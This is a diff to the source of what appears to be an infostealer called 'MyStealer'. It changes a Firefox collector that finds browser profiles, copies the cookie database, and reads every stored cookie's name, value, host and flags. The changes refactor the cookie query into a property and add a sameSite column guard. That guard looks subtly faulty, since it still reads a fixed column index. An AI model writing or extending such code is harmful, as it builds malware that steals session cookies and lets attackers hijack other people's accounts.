@@ -15,9 +15,11 @@ namespace MyStealer.Collectors.Browser
     {
         public virtual string ApplicationName => "FireFox";
         protected virtual string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "FireFox", "Profiles");
-       
+
+        protected virtual string CookieSql => "SELECT name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
+
         private ILogger lazyLogger;
-        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
 
         public virtual string[] LibDirectory => new string[] { "Mozilla FireFox" };
 
@@ -225,7 +227,7 @@ namespace MyStealer.Collectors.Browser
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                 using (var cmd = connection.CreateCommand())
                 {
-                    cmd.CommandText = "SELECT name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
+                    cmd.CommandText = CookieSql;
 
                     using (var reader = cmd.ExecuteReader())
                     {
@@ -240,7 +242,8 @@ namespace MyStealer.Collectors.Browser
                             var creationTime = reader.GetInt64(6);
                             var isSecure = reader.GetInt16(7);
                             var isHttpOnly = reader.GetInt16(8);
-                            var sameSite = reader.GetInt16(9);
+                            var sameSiteIndex = reader.GetOrdinal("sameSite");
+                            var sameSite = sameSiteIndex >= 0 ? reader.GetInt16(9) : 0;
 
                             var expiryDate = new DateTime(expiry, DateTimeKind.Local);
                             var lastAccessedDate = new DateTime(lastAccessed, DateTimeKind.Local);
